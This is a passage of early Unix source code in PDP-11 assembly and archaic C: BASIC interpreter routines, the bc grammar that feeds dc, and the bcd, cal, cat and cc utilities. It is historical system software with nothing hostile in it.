	mov	r1,-(sp)
	mov	r2,-(sp)
	clr	-(sp)
	clrf	fr0
	clr	r2
	jsr	r5,*(r5)
	cmpb	r0,$'-
	bne	2f
	inc	(sp)
1:
	jsr	r5,*(r5)
2:
	sub	$'0,r0
	cmp	r0,$9.
	bhi	2f
	jsr	pc,dig
		br	1b
	inc	r2
	br	1b
2:
	cmpb	r0,$'.-'0
	bne	2f
1:
	jsr	r5,*(r5)
	sub	$'0,r0
	cmp	r0,$9.
	bhi	2f
	jsr	pc,dig
		dec r2
	br	1b
2:
	cmpb	r0,$'e-'0
	bne	1f
	jsr	r5,atoi
	sub	$'0,r0
	add	r1,r2
1:
	movf	$one,fr1
	mov	r2,-(sp)
	beq	2f
	bgt	1f
	neg	r2
1:
	cmp	r2,$38.
	blos	1f
	clrf	fr0
	tst	(sp)+
	bmi	out
	movf	$huge,fr0
	br	out
1:
	mulf	$ten,fr1
	sob	r2,1b
2:
	tst	(sp)+
	bge	1f
	divf	fr1,fr0
	br	2f
1:
	mulf	fr1,fr0
	cfcc
	bvc	2f
	movf	$huge,fr0
2:
out:
	tst	(sp)+
	beq	1f
	negf	fr0
1:
	add	$'0,r0
	mov	(sp)+,r2
	mov	(sp)+,r1
	movf	(sp)+,fr1
	ldfps	(sp)+
	tst	(r5)+
	rts	r5

dig:
	cmpf	$big,fr0
	cfcc
	blt	1f
	mulf	$ten,fr0
	movif	r0,fr1
	addf	fr1,fr0
	rts	pc
1:
	add	$2,(sp)
	rts	pc

one	= 40200
ten	= 41040
big	= 56200
huge	= 77777

.globl	_ndigits
.globl ecvt
.globl fcvt

ftoa:
	jsr	pc,ecvt
	mov	r0,bufptr
	tstb	r1
	beq	1f
	mov	$'-,r0
	jsr	r5,*(r5)
1:
	cmp	r3,$-2
	blt	econ
	cmp	r2,$-5
	ble	econ
	cmp	r2,$6
	bgt	econ
	jsr	pc,cout
	tst	(r5)+
	rts	r5

econ:
	mov	r2,-(sp)
	mov	$1,r2
	jsr	pc,cout
	mov	$'e,r0
	jsr	r5,*(r5)
	mov	(sp)+,r0
	dec	r0
	jmp	itoa

cout:
	mov	bufptr,r1
	add	_ndigits,r1
	mov	r2,-(sp)
	add	bufptr,r2
1:
	cmp	r1,r2
	blos	1f
	cmpb	-(r1),$'0
	beq	1b
	inc	r1
1:
	mov	(sp)+,r2
	bge	2f
	mov	$'.,r0
	jsr	r5,*(r5)
1:
	mov	$'0,r0
	jsr	r5,*(r5)
	inc	r2
	blt	1b
	dec	r2
2:
	mov	r2,-(sp)
	mov	bufptr,r2
1:
	cmp	r2,r1
	bhis	1f
	tst	(sp)
	bne	2f
	mov	$'.,r0
	jsr	r5,*(r5)
2:
	dec	(sp)
	movb	(r2)+,r0
	jsr	r5,*(r5)
	br	1b
1:
	tst	(sp)+
	rts	pc

.bss
bufptr:	.=.+2
.text

ftoo:
	stfps	-(sp)
	ldfps	$200
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	$buf,r1
	movf	fr0,(r1)+
	mov	$buf,r2
	br	2f
1:
	cmp	r2,r1
	bhis	1f
	mov	$';,r0
	jsr	r5,*(r5)
2:
	mov	(r2)+,r0
	jsr	pc,oct
	br	1b
1:
	mov	$'\n,r0
	jsr	pc,*(r5)+
	ldfps	(sp)+
	rts	r5

oct:
	mov	r0,x+2
	setl
	movif	x,fr0
	mulf	$small,fr0
	seti
	mov	$6.,-(sp)
1:
	modf	$eight,fr0
	movfi	fr1,r0
	add	$'0,r0
	jsr	r5,*(r5)
	dec	(sp)
	bne	1b
	tst	(sp)+
	rts	pc

eight	= 41000
small	= 33600
.bss
buf:	.=.+8
x:	.=.+4
.text

itoa:
	mov	r1,-(sp)
	mov	r0,r1
	bge	1f
	neg	r1
	mov	$'-,r0
	jsr	r5,*(r5)
1:
	jsr	pc,1f
	mov	(sp)+,r1
	tst	(r5)+
	rts	r5

1:
	clr	r0
	dvd	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	r5,*(r5)
	rts	pc
/ bas -- BASIC
/ new command "dump" which dumps symbol table values by name
/		R. Haight
/
_dump:
	mov	r4,-(sp)
	mov	$11.*14.+symtab-14.,r4
1:
	add	$14.,r4
	tst	(r4)
	beq	1f
	bit	$1,4(r4)
	beq	1b
	jsr	pc,dmp1
	mov	$'=,r0
	jsr	r5,xputc
	movf	6(r4),r0
	jsr	r5,ftoa; xputc
	mov	$'\n,r0
	jsr	r5,xputc
	br	1b
1:
	mov	(sp)+,r4
	jmp	*(r4)+

dmp1:
	tst	(r4)
	blt	1f
	mov	(r4),nameb
	mov	2(r4),nameb+2
	mov	$nameb,r0
	jsr	pc,print
	rts	pc
1:
	mov	r4,-(sp)
	mov	$symtab-14.,r4
1:
	add	$14.,r4
	tst	(r4)
	beq	1f
	mov	4(r4),r0
	bic	$1,r0
2:
	beq	1b
	cmp	r0,(sp)
	beq	2f
	mov	2(r0),r0
	br	2b
2:
	jsr	pc,dmp1
	mov	$'[,r0
	jsr	r5,xputc
	mov	*(sp),r0
	com	r0
	movif	r0,r0
	jsr	r5,ftoa; xputc
	mov	$'],r0
	jsr	r5,xputc
1:
	mov	(sp)+,r4
	rts	pc
/
/

/ basx -- data

one = 40200

.data

_ndigits:10.
tmpf:	</tmp/btma\0>
argname: <b.out\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0>
vt:	</dev/vt0\0>
.even
pname:	<\0\0\0\0\0\0>
	.even

resnam:
	<list>
	<done>
	<q\0\0\0>
	<run\0>
	<prin>
	<prom>   / prompt is like print without \n (cr)
	<if\0\0>
	<goto>
	<retu>
	<for\0>
	<next>
	<octa>
	<save>
	<dump>
	<fi\0\0>
	<else>
	<edit>
	<comm>  / comment
.if scope / for plotting
	<disp>
	<draw>
	<eras>
.endif
eresnam:

symtnam:
	<arg\0>
	<exp\0>
	<log\0>
	<sin\0>
	<cos\0>
	<atn\0>
	<rnd\0>
	<expr>
	<int\0>
	<abs\0>
	<sqr\0>
esymtnam:

/ indirect sys calls:
sysseek:	sys	seek; seekx: 0; 0
syswrit:	sys	write; wbuf: 0; wlen: 0
sysread:	sys	read; rbuf: 0; rlen: 0
sysopen:	sys	open; ofile: 0 ; omode: 0
syscreat:	sys	creat; cfile: 0; cmode: 0
.bss
drx:	.=.+8
dry:	.=.+8
drfo:	.=.+2
ch:	.=.+2
drflg:	.=.+2
randx:	.=.+2
gsp:	.=.+2
forp:	.=.+2
exprloc:.=.+2
sstack:	.=.+2
sublev:	.=.+2
val:	.=.+2
splimit:	.=.+2  / statement size limit
iflev:	.=.+20.  / nested if compile stack: 10 deep
ifp:	.=.+2    / current pointer to iflev
line:	.=.+100.
prfile:	.=.+2   / output from _list or _save
tfi:	.=.+2  / input file
func:	.=.+2   / alternate functions, eg: _list or _save
seeka:	.=.+2   / seek offset 1
lineno:	.=.+2
nameb:	.=.+4
tfo:	.=.+2
symtab:	.=.+2800.; esymtab: / symbol=7wds; symtab for 200
space:	.=.+8000.; espace: / code space
exline:	.=.+1000.; eexline: / line execute space
lintab:	.=.+1800.; elintab: / 3wds per statement = 300 stmts
stack:	.=.+800.; estack:

iobuf: fi: .=.+518.  / should be aquired??
-- /usr/source/s1/bc.y mode=0110664 uid=3 gid=3 atime=174922439 mtime=169272304 --
%right '='
%left '+' '-'
%left '*' '/' '%'
%right '^'
%left UMINUS

%term LETTER DIGIT SQRT _IF  FFF EQ
%term _WHILE _FOR NE LE GE INCR DECR
%term _RETURN _BREAK _DEFINE BASE OBASE SCALE
%term EQPL EQMI EQMUL EQDIV EQREM EQEXP
%term _AUTO DOT
%term QSTR

%{
char cary[1000], *cp { cary };
char string[1000], *str {string};
int crs '0';
int rcrs '0';  /* reset crs */
int bindx 0;
int lev 0;
int bstack[10] { 0 };
char *numb[15] {
  " 0", " 1", " 2", " 3", " 4", " 5",
  " 6", " 7", " 8", " 9", " 10", " 11",
  " 12", " 13", " 14" };
int *pre, *post;
%}
%%
start	: 
	|  start stat tail
		= output( $2 );
	|  start def dargs ')' '{' dlist slist '}'
		={	bundle( pre, $7, post );
			conout( $$, $2 );
			rcrs = crs;
			output( "" );
			lev = bindx = 0;
			}
	;

dlist	:  tail
	| dlist _AUTO dlets tail
	;

stat	:  e 
		={ bundle( $1, "ps." ); }
	| 
		={ bundle( "" ); }
	|  QSTR
		={ bundle("[",$1,"]P");}
	|  LETTER '=' e
		={ bundle( $3, "s", $1 ); }
	|  LETTER '[' e ']' '=' e
		={ bundle( $6, $3, ":", geta($1)); }
	|  LETTER EQOP e
		={ bundle( "l", $1, $3, $2, "s", $1 ); }
	|  LETTER '[' e ']' EQOP e
		={ bundle($3, ";", geta($1), $6, $5, $3, ":", geta($1));}
	|  _BREAK
		={ bundle( numb[lev-bstack[bindx-1]], "Q" ); }
	|  _RETURN '(' e ')'
		= bundle( $3, post, numb[lev], "Q" );
	|  _RETURN '(' ')'
		= bundle( "0", post, numb[lev], "Q" );
	| SCALE e
		= bundle( $2, "k" );
	| SCALE '=' e
		= bundle( $3, "k");
	| SCALE EQOP e
		= bundle("K",$3,$2,"k");
	| BASE e
		= bundle( $2, "i" );
	| BASE '=' e
		= bundle($3, "i");
	| BASE EQOP e
		= bundle("I",$3,$2,"i");
	| OBASE e
		= bundle( $2, "o" );
	| OBASE '=' e
		= bundle($3,"o");
	| OBASE EQOP e
		= bundle("O",$3,$2,"o");
	|  '{' slist '}'
		={ $$ = $2; }
	|  FFF
		={ bundle("f"); }
	|  error
		={ bundle("c"); }
	|  _IF CRS BLEV '(' re ')' stat
		={	conout( $7, $2 );
			bundle( $5, $2, " " );
			}
	|  _WHILE CRS '(' re ')' stat BLEV
		={	bundle( $6, $4, $2 );
			conout( $$, $2 );
			bundle( $4, $2, " " );
			}
	|  fprefix CRS re ';' e ')' stat BLEV
		={	bundle( $7, $5, "s.", $3, $2 );
			conout( $$, $2 );
			bundle( $1, "s.", $3, $2, " " );
			}
	|  '~' LETTER '=' e
		={	bundle($4,"S",$2); }
	;

EQOP	:  EQPL
		={ $$ = "+"; }
	|  EQMI
		={ $$ = "-"; }
	|  EQMUL
		={ $$ = "*"; }
	|  EQDIV
		={ $$ = "/"; }
	|  EQREM
		={ $$ = "%%"; }
	|  EQEXP
		={ $$ = "^"; }
	;

fprefix	:  _FOR '(' e ';'
		={ $$ = $3; }
	;

BLEV	:
		={ --bindx; }
	;

slist	:  stat
	|  slist tail stat
		={ bundle( $1, $3 ); }
	;

tail	:  '\n'
	|  ';'
	;

re	:  e EQ e
		= bundle( $1, $3, "=" );
	|  e '<' e
		= bundle( $1, $3, ">" );
	|  e '>' e
		= bundle( $1, $3, "<" );
	|  e NE e
		= bundle( $1, $3, "!=" );
	|  e GE e
		= bundle( $1, $3, "!>" );
	|  e LE e
		= bundle( $1, $3, "!<" );
	|  e
		= bundle( $1, " 0!=" );
	;

e	:  e '+' e
		= bundle( $1, $3, "+" );
	|  e '-' e
		= bundle( $1, $3, "-" );
	| '-' e		%prec UMINUS
		= bundle( " 0", $2, "-" );
	|  e '*' e
		= bundle( $1, $3, "*" );
	|  e '/' e
		= bundle( $1, $3, "/" );
	|  e '%' e
		= bundle( $1, $3, "%%" );
	|  e '^' e
		= bundle( $1, $3, "^" );
	|  LETTER '[' e ']'
		={ bundle($3, ";", geta($1)); }
	|  LETTER INCR
		= bundle( "l", $1, "d1+s", $1 );
	|  INCR LETTER
		= bundle( "l", $2, "1+ds", $2 );
	|  DECR LETTER
		= bundle( "l", $2, "1-ds", $2 );
	|  LETTER DECR
		= bundle( "l", $1, "d1-s", $1 );
	| LETTER '[' e ']' INCR
		= bundle($3,";",geta($1),"d1+",$3,":",geta($1));
	| INCR LETTER '[' e ']'
		= bundle($4,";",geta($2),"1+d",$4,":",geta($2));
	| LETTER '[' e ']' DECR
		= bundle($3,";",geta($1),"d1-",$3,":",geta($1));
	| DECR LETTER '[' e ']'
		= bundle($4,";",geta($2),"1-d",$4,":",geta($2));
	| SCALE INCR
		= bundle("Kd1+k");
	| INCR SCALE
		= bundle("K1+dk");
	| SCALE DECR
		= bundle("Kd1-k");
	| DECR SCALE
		= bundle("K1-dk");
	| BASE INCR
		= bundle("Id1+i");
	| INCR BASE
		= bundle("I1+di");
	| BASE DECR
		= bundle("Id1-i");
	| DECR BASE
		= bundle("I1-di");
	| OBASE INCR
		= bundle("Od1+o");
	| INCR OBASE
		= bundle("O1+do");
	| OBASE DECR
		= bundle("Od1-o");
	| DECR OBASE
		= bundle("O1-do");
	|  LETTER '(' cargs ')'
		= bundle( $3, "l", getf($1), "x" );
	|  LETTER '(' ')'
		= bundle( "l", getf($1), "x" );
	|  cons
		={ bundle( " ", $1 ); }
	|  DOT cons
		={ bundle( " .", $2 ); }
	|  cons DOT cons
		={ bundle( " ", $1, ".", $3 ); }
	|  cons DOT
		={ bundle( " ", $1, "." ); }
	|  DOT
		={ $$ = "l."; }
	|  LETTER
		= { bundle( "l", $1 ); }
	|  LETTER '=' e
		={ bundle( $3, "ds", $1 ); }
	|  LETTER EQOP e	%prec '='
		={ bundle( "l", $1, $3, $2, "ds", $1 ); }
	|  '(' e ')'
		= { $$ = $2; }
	|  '?'
		={ bundle( "?" ); }
	|  SQRT '(' e ')'
		={ bundle( $3, "v" ); }
		| '~' LETTER
		={ bundle("L",$2); }
	| SCALE e
		= bundle($2,"dk");
	| SCALE '=' e
		= bundle($3,"dk");
	| SCALE EQOP e		%prec '='
		= bundle("K",$3,$2,"dk");
	| BASE e
		= bundle($2,"di");
	| BASE '=' e
		= bundle($3,"di");
	| BASE EQOP e		%prec '='
		= bundle("I",$3,$2,"di");
	| OBASE e
		= bundle($2,"do");
	| OBASE '=' e
		= bundle($3,"do");
	| OBASE EQOP e		%prec '='
		= bundle("O",$3,$2,"do");
	| SCALE
		= bundle("K");
	| BASE
		= bundle("I");
	| OBASE
		= bundle("O");
	;

cargs	:  eora
	|  cargs ',' eora
		= bundle( $1, $3 );
	;
eora:	  e
	| LETTER '[' ']'
		=bundle("l",geta($1));
	;

cons	:  constant
		={ *cp++ = '\0'; }

constant:
	  '_'
		={ $$ = cp; *cp++ = '_'; }
	|  DIGIT
		={ $$ = cp; *cp++ = $1; }
	|  constant DIGIT
		={ *cp++ = $2; }
	;

CRS	:
		={ $$ = cp; *cp++ = crs++; *cp++ = '\0'; bstack[bindx++] = lev++; }
	;

def	:  _DEFINE LETTER '('
		={	$$ = getf($2);
			pre = "";
			post = "";
			lev = 1;
			bstack[bindx=0] = 0;
			}
	;

dargs	:
	|  lora
		={ pp( $1 ); }
	|  dargs ',' lora
		={ pp( $3 ); }
	;

dlets	:  lora
		={ tp($1); }
	|  dlets ',' lora
		={ tp($3); }
	;
lora	:  LETTER
	|  LETTER '[' ']'
		={ $$ = geta($1); }
	;

%%
# define error 256

int peekc -1;
int sargc;
int ifile;
char **sargv;
extern int fin;

char *funtab[26]{
	01,02,03,04,05,06,07,010,011,012,013,014,015,016,017,
	020,021,022,023,024,025,026,027,030,031,032 };
char *atab[26]{
	0241,0242,0243,0244,0245,0246,0247,0250,0251,0252,0253,
	0254,0255,0256,0257,0260,0261,0262,0263,0264,0265,0266,
	0267,0270,0271,0272};
char *letr[26] {
  "a","b","c","d","e","f","g","h","i","j",
  "k","l","m","n","o","p","q","r","s","t",
  "u","v","w","x","y","z" } ;
char *dot { "." };
yylex(){
  int c,ch;
restart:
  c = getc();
  peekc = -1;
  while( c == ' ' || c == '\t' ) c = getc();
  if( c<= 'z' && c >= 'a' ) {
    /* look ahead to look for reserved words */
    peekc = getc();
    if( peekc >= 'a' && peekc <= 'z' ){ /* must be reserved word */
      if( c=='i' && peekc=='f' ){ c=_IF; goto skip; }
      if( c=='w' && peekc=='h' ){ c=_WHILE; goto skip; }
      if( c=='f' && peekc=='o' ){ c=_FOR; goto skip; }
      if( c=='s' && peekc=='q' ){ c=SQRT; goto skip; }
      if( c=='r' && peekc=='e' ){ c=_RETURN; goto skip; }
      if( c=='b' && peekc=='r' ){ c=_BREAK; goto skip; }
      if( c=='d' && peekc=='e' ){ c=_DEFINE; goto skip; }
      if( c=='s' && peekc=='c' ){ c= SCALE; goto skip; }
      if( c=='b' && peekc=='a' ){ c=BASE; goto skip; }
      if( c=='o' && peekc=='b' ){ c=OBASE; goto skip; }
      if( c=='d' && peekc=='i' ){ c=FFF; goto skip; }
      if( c=='a' && peekc=='u' ){ c=_AUTO; goto skip; }
      if( c == 'q' && peekc == 'u')getout();
      /* could not be found */
      return( error );
    skip:  /* skip over rest of word */
	peekc = -1;
      while( (ch = getc()) >= 'a' && ch <= 'z' );
	peekc = ch;
      return( c );
      }

    /* usual case; just one single letter */

    yylval = letr[c-'a'];
    return( LETTER );
    }
  if( c>= '0' && c <= '9' || c>= 'A' && c<= 'F' ){
    yylval = c;
    return( DIGIT );
    }
  switch( c ){
    case '.':  return( DOT );
    case '=':
      switch( peekc = getc() ){
        case '=': c=EQ; goto gotit;
        case '+': c=EQPL; goto gotit;
        case '-': c=EQMI; goto gotit;
        case '*': c=EQMUL; goto gotit;
        case '/': c=EQDIV; goto gotit;
        case '%': c=EQREM; goto gotit;
        case '^': c=EQEXP; goto gotit;
        default:   return( '=' );
        gotit:     peekc = -1; return(c);
        }
    case '+':  return( cpeek( '+', INCR, '+' ) );
    case '-':  return( cpeek( '-', DECR, '-' ) );
    case '<':  return( cpeek( '=', LE, '<' ) );
    case '>':  return( cpeek( '=', GE, '>' ) );
    case '!':  return( cpeek( '=', NE, '!' ) );
    case '/':
	if((peekc = getc()) == '*'){
		peekc = -1;
		while((getc() != '*') || ((peekc = getc()) != '/'));
		peekc = -1;
		goto restart;
	}
	else return(c);
    case '"':  
	       yylval = str;
	       while((c=getc()) != '"')*str++ = c;
	       *str++ = '\0';
	       return(QSTR);
    default:   return( c );
    }
  }

cpeek( c, yes, no ){
  if( (peekc=getc()) != c ) return( no );
  else {
    peekc = -1;
    return( yes );
    }
  }

getc(){
  int ch;
loop:
  ch = (peekc < 0) ? getchar() : peekc;
  peekc = -1;
  if(ch != '\0')return(ch);
  if(++ifile > sargc){
	if(ifile >= sargc+2)getout();
	fin = dup(0);
	goto loop;
  }
close(fin);
  if((fin = open(sargv[ifile],0)) >= 0)goto loop;
  yyerror("cannot open input file");
}
# define b_sp_max 1500
int b_space [ b_sp_max ];
int * b_sp_nxt { b_space };

bdebug 0;
bundle(a){
  int i, *p, *q;

  i = nargs();
  q = b_sp_nxt;

  if( bdebug ) printf("bundle %d elements at %o\n", i, q );

  for( p = &a; i-->0; ++p ){

    if( b_sp_nxt >= & b_space[b_sp_max] ) yyerror( "bundling space exceeded" );

    * b_sp_nxt++ = *p;
    }
  * b_sp_nxt++ = 0;
  yyval = q;
  return( q );
  }

routput(p) int *p; {
  if( bdebug ) printf("routput(%o)\n", p );
  if( p >= &b_space[0] && p < &b_space[b_sp_max]){
    /* part of a bundle */
    while( *p != 0 ) routput( *p++ );
    }
  else printf( p );   /* character string */
  }

output( p ) int *p; {
  routput( p );
  b_sp_nxt = & b_space[0];
  printf( "\n" );
  cp = cary;
  str = string;
  crs = rcrs;
  }

conout( p, s ) int *p; char *s; {
  printf("[");
  routput( p );
  printf("]s%s\n", s );
  lev--;
  str = string;
  }

yyerror( s ) char *s; {
  printf("c[%s]pc\n", s );
  cp = cary;
  crs = rcrs;
  bindx = 0;
  lev = 0;
  b_sp_nxt = &b_space[0];
 str = string;
  }

pp( s ) char *s; {
  /* puts the relevant stuff on pre and post for the letter s */

  bundle( "S", s, pre );
  pre = yyval;
  bundle( post, "L", s, "s." );
  post = yyval;
  }

tp( s ) char *s; { /* same as pp, but for temps */
  bundle( "0S", s, pre );
  pre = yyval;
  bundle( post, "L", s, "s." );
  post = yyval;
  }

yyinit(argc,argv) int argc; char *argv[];{
  int (*getout)();
  signal( 2, getout );  /* ignore all interrupts */
  sargv=argv;
  sargc= -- argc;
  if(sargc == 0)fin=dup(0);
   else if((fin = open(sargv[1],0)) < 0)
	yyerror("cannot open input file");
  ifile = 1;
  }
getout(){
printf("q");
exit();
}

getf(p) char *p;{
return(&funtab[*p -0141]);
}
geta(p) char *p;{
	return(&atab[*p - 0141]);
}

main(argc, argv)
char **argv;
{
	int p[2];


	if (argc > 1 && *argv[1] == '-') {
		if(argv[1][1] == 'd'){
			yyinit(--argc, ++argv);
			yyparse();
			exit();
		}
		if(argv[1][1] != 'l'){
			printf("unrecognizable argument\n");
			exit();
		}
		argv[1] = "/usr/lib/lib.b";
	}
	pipe(p);
	if (fork()==0) {
		close(1);
		dup(p[1]);
		close(p[0]);
		close(p[1]);
		yyinit(argc, argv);
		yyparse();
		exit();
	}
	close(0);
	dup(p[0]);
	close(p[0]);
	close(p[1]);
	execl("/bin/dc", "dc", "-", 0);
}
-- /usr/source/s1/bcd.c mode=0100664 uid=3 gid=3 atime=174922490 mtime=169260569 --
int chtab[]{
00000, /*   */
03004, /* ! */
02404, /* " */
02040, /* sharp */
02042, /* $ */
02104, /* % */
00001, /* & */
03002, /* ' */
02201, /* ( */
02202, /* ) */
02102, /* * */
00005, /* + */
02044, /* , */
00002, /* - */
02041, /* . */
00014, /* / */
00004, /* 0 */
00010, /* 1 */
00020, /* 2 */
00040, /* 3 */
00100, /* 4 */
00200, /* 5 */
00400, /* 6 */
01000, /* 7 */
02000, /* 8 */
04000, /* 9 */
02200, /* : */
02402, /* ; */
02401, /* < */
02204, /* = */
02400, /* > */
03000, /* ? */
02100, /* at */
 011,
 021,
 041,
0101,
0201,
0401,
01001,
02001,
04001,
012,
022,
042,
0102,
0202,
0402,
01002,
02002,
02002,
024,
044,
0104,
0204,
0404,
01004,
02004,
04004,
02020, /* [ */
03001, /* \ */
02101, /* ] */
00006, /* ^ */
02024 /* _ */
};
	char s[128];
	char *sp {&s[0]};
main(argc, argv)
char *argv[];
{
	char *spp;
	int i;
	int j;
	int c;
	int l;

	if (argc<2) {
		puts("% ");
		while ((c=getchar())!='\0'&c!='\n')
			*sp++ = c;
		*sp = 0;
		sp = &s[0];
	} else
		sp = *++argv;
	puts("\n\n\n\n");
	puts(" ________________________________");
	puts("________________\n");
	spp = sp;
	while(*spp++);
	spp--;
	l = spp - sp;
	putchar('/');
	puts(sp);
	i = 49 - l;
	while(--i>0) putchar(' ');
	puts("|\n");
	j = 0;
	spp = sp;
	while (j++<12) {
		putchar('|');
		i = 0;
		spp = sp;
		while (i<48) {
			c = *spp++ - 040;
			i++;
			if (c>='a'-040) c = c - 040;
			if (i>l) c = 0;
			if (c<0 | c>137) c = 0;
			if ((chtab[c]>>(j-1))&1) 
				puts("[]");
			else
				putchar(j>3?'0'+j-3:' ');
		}
		puts("|\n");
	}
	putchar('|');
	puts("____________");
	puts("____________________________________");
	puts("|\n");
	puts("\n\n\n\n");
}

puts(ss) char *ss; {
	int i;
	char t;
	i = 0;
	while(t = *ss++) {
		if(t >= 'a' && t <= 'z')
			t =+ 'A'-'a';
		putchar(t);
	}
}
-- /usr/source/s1/cal.c mode=0100664 uid=3 gid=3 atime=174922503 mtime=169260569 --
char	dayw[]
{
	" S  M Tu  W Th  F  S"
};
char	*smon[]
{
	"Jan", "Feb", "Mar", "Apr",
	"May", "Jun", "Jul", "Aug",
	"Sep", "Oct", "Nov", "Dec",
};
char	string[432];
main(argc, argv)
char *argv[];
{
	register y, i, j;
	int m;

	if(argc < 2) {
		printf("usage: cal [month] year\n");
		exit();
	}
	if(argc == 2)
		goto xlong;

/*
 *	print out just month
 */

	m = number(argv[1]);
	if(m<1 || m>12)
		goto badarg;
	y = number(argv[2]);
	if(y<1 || y>9999)
		goto badarg;
	printf("      %s %l\n", smon[m-1], y);
	printf("%s\n", dayw);
	cal(m, y, string, 24);
	for(i=0; i<6*24; i=+24)
		pstr(string+i, 24);
	exit();

/*
 *	print out complete year
 */

xlong:
	y = number(argv[1]);
	if(y<1 || y>9999)
		goto badarg;
	printf("\n\n\n");
	printf("				%l\n", y);
	printf("\n");
	for(i=0; i<12; i=+3) {
		for(j=0; j<6*72; j++)
			string[j] = '\0';
		printf("	 %s", smon[i]);
		printf("			%s", smon[i+1]);
		printf("		       %s\n", smon[i+2]);
		printf("%s   %s   %s\n", dayw, dayw, dayw);
		cal(i+1, y, string, 72);
		cal(i+2, y, string+23, 72);
		cal(i+3, y, string+46, 72);
		for(j=0; j<6*72; j=+72)
			pstr(string+j, 72);
	}
	printf("\n\n\n");
	exit();

badarg:
	printf("Bad argument\n");
}

number(str)
char *str;
{
	register n, c;
	register char *s;

	n = 0;
	s = str;
	while(c = *s++) {
		if(c<'0' || c>'9')
			return(0);
		n = n*10 + c-'0';
	}
	return(n);
}

pstr(str, n)
char *str;
{
	register i;
	register char *s;

	s = str;
	i = n;
	while(i--)
		if(*s++ == '\0')
			s[-1] = ' ';
	i = n+1;
	while(i--)
		if(*--s != ' ')
			break;
	s[1] = '\0';
	printf("%s\n", str);
}

char	mon[]
{
	0,
	31, 29, 31, 30,
	31, 30, 31, 31,
	30, 31, 30, 31,
};

cal(m, y, p, w)
char *p;
{
	register d, i;
	register char *s;

	s = p;
	d = jan1(y);
	mon[2] = 29;
	mon[9] = 30;

	switch((jan1(y+1)+7-d)%7) {

	/*
	 *	non-leap year
	 */
	case 1:
		mon[2] = 28;
		break;

	/*
	 *	1752
	 */
	default:
		mon[9] = 19;
		break;

	/*
	 *	leap year
	 */
	case 2:
		;
	}
	for(i=1; i<m; i++)
		d =+ mon[i];
	d =% 7;
	s =+ 3*d;
	for(i=1; i<=mon[m]; i++) {
		if(i==3 & mon[m]==19) {
			i =+ 11;
			mon[m] =+ 11;
		}
		if(i > 9)
			*s = i/10+'0';
		s++;
		*s++ = i%10+'0';
		s++;
		if(++d == 7) {
			d = 0;
			s = p+w;
			p = s;
		}
	}
}

/*
 *	return day of the week
 *	of jan 1 of given year
 */

jan1(yr)
{
	register y, d;

/*
 *	normal gregorian calendar
 *	one extra day per four years
 */

	y = yr;
	d = 4+y+(y+3)/4;

/*
 *	julian calendar
 *	regular gregorian
 *	less three days per 400
 */

	if(y > 1800) {
		d =- (y-1701)/100;
		d =+ (y-1601)/400;
	}

/*
 *	great calendar changeover instant
 */

	if(y > 1752)
		d =+ 3;

	return(d%7);
}
-- /usr/source/s1/cat.s mode=0100664 uid=3 gid=3 atime=174922515 mtime=169260569 --
/ cat -- concatinate files

	mov	(sp)+,r5
	tst	(sp)+
	mov	$obuf,r2
	cmp	r5,$1
	beq	3f

loop:
	dec	r5
	ble	done
	mov	(sp)+,r0
	cmpb	(r0),$'-
	bne	2f
	clr	fin
	br	3f
2:
	mov	r0,0f
	sys	open; 0:..; 0
	bes	loop
	mov	r0,fin
3:
	mov	fin,r0
	sys	read; ibuf; 512.
	bes	3f
	mov	r0,r4
	beq	3f
	mov	$ibuf,r3
4:
	movb	(r3)+,r0
	jsr	pc,putc
	dec	r4
	bne	4b
	br	3b
3:
	mov	fin,r0
	beq	loop
	sys	close
	br	loop

done:
	sub	$obuf,r2
	beq	1f
	mov	r2,0f
	mov	$1,r0
	sys	write; obuf; 0:..
1:
	sys	exit

putc:
	movb	r0,(r2)+
	cmp	r2,$obuf+512.
	blo	1f
	mov	$1,r0
	sys	write; obuf; 512.
	mov	$obuf,r2
1:
	rts	pc

	.bss
ibuf:	.=.+512.
obuf:	.=.+512.
fin:	.=.+2
	.text

-- /usr/source/s1/cc.c mode=0110664 uid=3 gid=3 atime=174922520 mtime=169589048 --
#define	SBSIZE	2000
char	sbf[SBSIZE];
/* C command */

char *tmp0;
char *tmp1;
char *tmp2;
char *tmp3;
char *tmp4;
char *tmp5;
char ts[1000];
char *tsp ts;
char *av[50];
char *clist[50];
char *llist[50];
int instring;
int pflag;
int sflag;
int cflag;
int oflag;
int proflag;
int depth;
int *ibuf;
int *ibuf1;
int *ibuf2;
int *obuf;
char *lp;
char *line;
int lineno;
int exfail;
struct symtab {
	char name[8];
	char *value;
} *symtab;
int symsiz 200;
struct symtab *defloc;
struct symtab *incloc;
struct symtab *eifloc;
struct symtab *ifdloc;
struct symtab *ifnloc;
struct symtab *unxloc;
int	trulvl;
int	flslvl;
char *stringbuf;
char *pass0 "/lib/c0";
char *pass1 "/lib/c1";
char *pass2 "/lib/c2";
char *pref "/lib/crt0.o";

main(argc, argv)
char *argv[]; {
	char *t;
	int nc, nl, i, j, c, f20, nxo;
	int dexit();

	i = nc = nl = f20 = nxo = 0;
	while(++i < argc) {
		if(*argv[i] == '-')
			switch (argv[i][1]) {
				default:
					goto passa;
				case 'S':
					sflag++;
					cflag++;
					break;
				case 'O':
					oflag++;
					break;
				case 'p':
					proflag++;
					pref = "/lib/mcrt0.o";
					break;
				case 'P':
					pflag++;
				case 'c':
					cflag++;
					break;

				case 'f':
					pref = "/lib/fcrt0.o";
					pass0 = "/lib/fc0";
					pass1 = "/lib/fc1";
					break;

				case '2':
					if(argv[i][2] == '\0')
						pref = "/lib/crt2.o";
					else {
						pref = "/lib/crt20.o";
						f20 = 1;
					}
					break;
				case 't':
					if (argv[i][2]=='0')
						pass0 = "/usr/c/c0";
					if (argv[i][2]=='1')
						pass1 = "/usr/c/c1";
					if (argv[i][2]=='2')
						pass2 = "/usr/c/c2";
					break;
			}
		else {
		passa:
			t = argv[i];
			if(getsuf(t)=='c') {
				clist[nc++] = t;
				t = setsuf(t, 'o');
			}
			if (nodup(llist, t)) {
				llist[nl++] = t;
				if (getsuf(t)=='o')
					nxo++;
			}
		}
	}
	if(nc==0)
		goto nocom;
	if (pflag==0) {
		tmp0 = copy("/tmp/ctm0a");
		while((c=open(tmp0, 0))>=0) {
			close(c);
			tmp0[9]++;
		}
